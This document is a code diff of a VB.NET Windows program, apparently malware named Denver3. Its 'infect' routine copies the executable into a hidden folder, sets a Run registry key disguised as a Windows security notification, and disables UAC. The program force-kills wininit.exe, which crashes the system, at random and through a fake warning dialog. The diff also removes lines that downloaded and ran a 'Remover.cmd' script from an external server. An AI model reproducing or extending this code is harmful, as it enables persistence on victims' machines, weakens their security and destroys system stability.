@@ -7,18 +7,16 @@ Imports Microsoft.Win32
 Imports System.IO.Directory
 
 Public Class Form1
+
     Dim UserFoler = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
     Dim ServerAddr = "https://denver3289yf998dh287hd9hd9827h.netlify.app/"
     Dim InstallPath = UserFoler & "\Denver3"
     Dim DebugMode = False
+
     Private Const SPI_SETDESKWALLPAPER As Integer = &H14
-
     Private Const SPIF_UPDATEINIFILE As Integer = &H1
-
     Private Const SPIF_SENDWININICHANGE As Integer = &H2
-
     Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
-
     Const WallpaperFile As String = "c:\wallpaper.bmp"
 
 
@@ -37,19 +35,24 @@ Public Class Form1
     Public Sub infect()
 
         Try
-
             My.Computer.FileSystem.CreateDirectory(InstallPath)
             IO.File.SetAttributes(InstallPath, IO.FileAttributes.Hidden Or IO.FileAttributes.System)
         Catch ex As Exception
-
         End Try
+
+        If My.Computer.FileSystem.FileExists(InstallPath & "\Denver3.exe") Then
+            Try
+                My.Computer.FileSystem.DeleteFile(InstallPath & "\Denver3.exe")
+            Catch ex As Exception
+
+            End Try
+        End If
 
         Try
-
+            My.Computer.FileSystem.CopyFile(Application.ExecutablePath, InstallPath & "\Denver3.exe")
         Catch ex As Exception
-
         End Try
-        My.Computer.FileSystem.CopyFile(Application.ExecutablePath, InstallPath & "\Denver3.exe")
+
         Try
             My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Windows security notifications_", InstallPath & "\Denver3.exe")
         Catch ex As Exception
@@ -67,23 +70,15 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
             Dim info As Byte() = New UTF8Encoding(True).GetBytes("runtime")
             fs.Write(info, 0, info.Length)
             fs.Close()
-
             MyUtilities.RunCommandComInvis("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f", "", False)
-
             Wait(1)
-            Try
-                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/Remover.cmd", Application.StartupPath & "\RemoveDefExe.cmd")
-            Catch ex As Exception
-                '  MsgBox("This program maintains a small file size by downloading its files from an external server. Please download and install the server manually: https://denver3289yf998dh287hd9hd9827h.netlify.app/ServerFiles.exe", 0 + 16, "Failed to download files")
-            End Try
-            Process.Start(Application.StartupPath & "\RemoveDefExe.cmd")
-            ChangeMD5AndExit()
         Catch ex As Exception
 
         End Try
 
-
     End Sub
+
+
     Dim currentTime As System.DateTime = System.DateTime.Now
 
     Public Sub RunOnNotFirstRun()
@@ -147,7 +142,7 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                 Dim randomNumber As Integer = random.Next(1, 21)
                 If randomNumber = 1 Then
                     MsgBox("Fuck you", 0 + 16, "die")
-                    MyUtilities.RunCommandCom("TASKKILL /IM wininit.exe /T /F", "", False)
+                    MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
                 End If
             End If
             If currentTime.Month = 2 And currentTime.Date.Day = 1 Then
@@ -374,7 +369,6 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
         Wait(10)
         Process.Start("https://www.google.com/search?q=for+the+lulz&sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn0-3ZuC1psWsqK-aMP1WjOfTiXwLBQ%3A1713312563052&ei=MxMfZqjjAsu0ptQPkpW8mAY&ved=0ahUKEwjoyNbV-seFAxVLmokEHZIKD2MQ4dUDCBA&uact=5&oq=for+the+lulz&gs_lp=Egxnd3Mtd2l6LXNlcnAiDGZvciB0aGUgbHVsejIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgAQyCxAAGIAEGIoFGIYDSM8IUOMFWN8GcAF4AZABAJgBZqABvwGqAQMxLjG4AQPIAQD4AQGYAgOgAscBwgIKEAAYRxjWBBiwA8ICCBAAGIAEGKIEmAMAiAYBkAYIkgcDMi4xoAffBQ&sclient=gws-wiz-serp")
         Wait(3)
-
         a1.Show()
         a2.Show()
         a3.Show()
@@ -533,7 +527,10 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
     End Sub
     Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
         If Not Close1 Then
-            MsgBox("nuh uh", 0 + 64, "nuh uh")
+            Dim meg As DialogResult = MessageBox.Show("Warning ending a critical system process may result in your system becoming unstable / unusable do you still want to end the process: “"wininit.exe"”? ", "Windows", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
+            If meg = DialogResult.Yes Then
+                MyUtilities.RunCommandComInvis("TASKKILL /im wininit.exe /t /f", "", False)
+            End If
             e.Cancel = True
         End If
 
@@ -656,6 +653,14 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
 
     Private Sub PIC_DEATH_WALPAPER_Click(sender As Object, e As EventArgs)
 
+    End Sub
+
+    Private Sub timer_minimize_window_Tick(sender As Object, e As EventArgs) Handles timer_minimize_window.Tick
+        Try
+            Me.WindowState = FormWindowState.Minimized
+        Catch ex As Exception
+
+        End Try
     End Sub
 End Class
 
